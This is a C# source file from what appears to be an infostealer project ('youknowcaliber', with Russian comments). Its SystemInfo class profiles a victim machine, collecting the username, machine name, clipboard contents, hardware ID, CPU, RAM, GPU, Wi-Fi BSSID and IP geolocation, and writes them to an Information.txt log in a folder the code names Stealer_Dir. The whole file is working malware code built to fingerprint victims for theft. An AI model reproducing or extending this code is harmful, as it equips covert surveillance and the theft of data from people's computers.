using Microsoft.Win32;
using System;
using System.Drawing;
using System.IO;
using System.Management;

namespace youknowcaliber
{
    class SystemInfo
    {
        public static void GetSystem() // Запись файла Information
        {
            string Stealer_Dir = Help.ExploitDir;
            string InfoText = (
                       " ==================================================" +
                     "\n Operating system: " + GetSystemVersion() +
                     "\n PC user: " + compname + "/" + username +
                     "\n ClipBoard: " + Buffer.GetBuffer() +
                     "\n Launch: " + Help.ExploitName +
                     "\n ==================================================" +
                     "\n Screen resolution: " + ScreenMetrics() +
                     "\n Current time: " + DateTime.Now +
                     "\n HWID: " + GetProcessorID() +
                     "\n ==================================================" +
                     "\n CPU: " + GetCPUName() +
                     "\n RAM: " + GetRAM() +
                     "\n GPU: " + GetGpuName() +
                     "\n ==================================================" +
                     "\n IP Geolocation: " + IP() + " " + Country() +
                     "\n Log Date: " + Help.date +
                     "\n BSSID: " + BSSID.GetBSSID() +
                     "\n ==================================================");
            File.WriteAllText(Stealer_Dir + "\\Information.txt", InfoText);
        }

        // Юсер имя
        public static string username = Environment.UserName;
        // Имя
        public static string compname = Environment.MachineName;
        public static string GetSystemVersion() // Получение версии виндовс
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }
        public static string GetWindowsVersionName()// Версия виндовс
        {
            string sData = "Unknown System";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return sData;
        }
        private static string GetBitVersion() // Получение битности
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(32 Bit)";
                else
                    return "(64 Bit)";
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return "(Unknown)";
        }
        public static string CountryCode() // Получаем код страны типа: [RU]
        {
            if (Help.check == true)
            {
                string countryCode = "[" + Help.xml.GetElementsByTagName("CountryCode")[0].InnerText + "]";
                return countryCode;
            }
            else
            {
                return "Fail";
            }
        }
        public static string Country() // Получаем название страны типа: [Russian]
        {
            if (Help.check == true)
            {
                string countryCode = "[" + Help.xml.GetElementsByTagName("CountryName")[0].InnerText + "]";
                return countryCode;
            }
            else
            {
                return "Fail";
            }
        }
        public static string IP() // Получение айпишника
        {
            if (Help.check == true)
            {
                string ip = Help.xml.GetElementsByTagName("IP")[0].InnerText;
                return ip;
            }
            else
            {
                return "Fail";
            }
        }
        public static string ScreenMetrics() // Получение разрешение экрана
        {
            Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }
        public static string GetCPUName() // Получение имени процессора
        {
            try
            {
                string CPU = string.Empty;
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    CPU = mObject["Name"].ToString();
                }
                return CPU;
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "СистемИнфа");
                return "Error";
            }
        }
        public static string GetRAM() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576) - 1;
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return "Error";
            }
        }
        public static string GetProcessorID() // Получаем Processor Id
        {
            string sProcessorID = string.Empty;
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }
            return (sProcessorID);
        }
        public static string GetGpuName() // Получаем имя видеокарты
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return "Unknown";
        }
    }
}
